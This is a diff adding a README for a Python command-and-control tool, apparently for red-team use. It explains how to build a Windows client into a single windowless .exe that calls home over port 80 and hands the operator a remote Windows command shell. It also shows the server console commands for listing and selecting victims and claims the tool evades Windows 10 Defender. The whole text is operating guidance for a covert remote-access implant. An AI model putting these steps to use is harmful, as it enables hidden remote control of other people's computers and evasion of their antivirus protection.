@@ -1,0 +1,68 @@
+
+This is a basic python command and control client / server setup based on python turtle. 
+
+The server side runs on Kali Linux. 
+
+The client.exe run on Windows and calls home to the server over port 80. This will report the hostname and IP address. 
+
+More advanced Red Team. 
+
+Once the client is connected you also have a Windows command shell - simples. 
+
+########### Client Side
+
+Set the IP address and port for the server in the client.py file
+
+        self.serverHost = '0.0.0.0.0'
+        self.serverPort = 80
+
+Build the cient.py into an .exe 
+
+This will work without visual studio and will work with python 3.6.6
+
+Moved into the directory where you have the updated client.py file, run the following command to create the .exe
+
+pip install pyinstaller
+
+pyinstaller -F -w client.py
+
+-F = 1 file with no dependancies
+-w = no console showing 
+
+The .exe will be placed in the dist directory. This will be a single file, no dependancies) 
+
+
+############# Server Side
+
+Log onto the Kali or Debian in AWS using the EC2-user account and your unique SSH certificate
+
+# make sure server.py is in your path and no other process are running on port 80 (netstat -antp) 
+
+# Run the following command
+
+python3 server.py
+
+# Then when a client connect you will see something similar to the following
+
+intelishell>
+Connection has been established: hostname (IP_Address)
+
+
+# For more advanced command and control - run the list command to see connected systems. 
+
+
+intelishell> list
+----- Clients -----
+0   10.0.0.1   3837   hostname-vm
+
+
+# To access the Windows command line - use the select command
+
+intelisehell> select 0 
+
+You are now connected to hostname-vm
+C:\Users\user.DESKTOP-G0E7TJT\Documents\OneDrive - directory\path\C2 Implants>
+
+At the time of writing, this basic tool defeats Windows 10 Defender. 
+
+
